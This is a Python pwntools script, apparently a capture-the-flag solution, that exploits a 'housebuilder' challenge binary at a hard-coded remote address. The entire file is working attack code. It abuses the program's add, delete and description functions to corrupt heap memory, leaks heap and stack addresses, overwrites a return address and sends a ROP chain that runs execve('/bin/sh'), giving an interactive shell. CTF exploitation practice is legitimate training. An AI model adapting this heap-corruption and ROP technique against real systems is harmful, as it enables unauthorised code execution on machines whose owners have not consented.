#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '151.236.114.211', 17174
binary = './housebuilder'
brkpts = '''
b * 0x41432a
'''

elf = ELF("housebuilder")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary)

def add(name,rooms,floors,people):
    io.sendlineafter("} > ","1")
    io.sendlineafter("{?} Enter name: ",name)
    io.sendlineafter("{?} Enter rooms count: ",str(rooms))
    io.sendlineafter("{?} Enter floors count: ",str(floors))
    io.sendlineafter("{?} Enter peoples count: ",str(people))

def delete(idx):
    io.sendlineafter("} > ","4")
    io.sendlineafter("{?} Enter house idx: ",str(idx))

def view():
    io.sendlineafter("} > ","3")

def sub(idx):
    io.sendlineafter("} > ","2")
    io.sendlineafter("{?} Enter house idx: ",str(idx))

def sell():
    io.sendlineafter("} > ","3")

def desc(desc):
    io.sendlineafter("} > ","2")
    io.sendlineafter("{?} Enter new description: ",desc)

def info():
    io.sendlineafter("} > ","1")

def back():
    io.sendlineafter("} > ","4")

addr1 = 0x5d64d0
hook = 0x5da3d8
environ = 0x5da448
pop_rdi = 0x41432a
pop_rax = 0x41fcba
pop_rsi = 0x407668
pop_rdx = 0x4044cf
syscall = 0x403c73

if __name__ == "__main__":
    add("aaaa",1,1,1)
    add("bbbb",2,2,2)
    add("cccc",3,3,3)
    add("ffff",4,4,4)
    add("gggg",7,7,7)
    add("bleh",8,8,8)
    delete(1)
    sub(0)
    sell()
    info()
    reu("Rooms: ")
    heap = int(rl())

    desc(p64(addr1))
    back()
    add("/bin/sh\x00",5,5,5)
    add("eeee",6,6,6)
    sub(0)
    desc(p64(environ - 0x10))
    back()
    sub(2)
    info()
    reu("Peoples: ")
    stack = int(rl())
    back()
    log.info("Heap -> "+hex(heap))
    log.info("Stack -> "+hex(stack))
    retaddr = stack - 0x140
    binsh = heap - 0x438
    #gdb.attach(io, brkpts)
    delete(5)
    sub(4)
    sell()
    desc(p64(retaddr))
    back()
    add("anand1",9,9,9)
    add("anand2",10,10,10)

    payload = flat([
        pop_rdi,
        binsh,
        0,
        pop_rsi,
        0,
        pop_rdx,
        0,
        pop_rax,
        0x3b,
        syscall
    ])
    sub(3)
    desc(payload)
    back()
    io.sendlineafter("} > ","5")

    io.interactive()
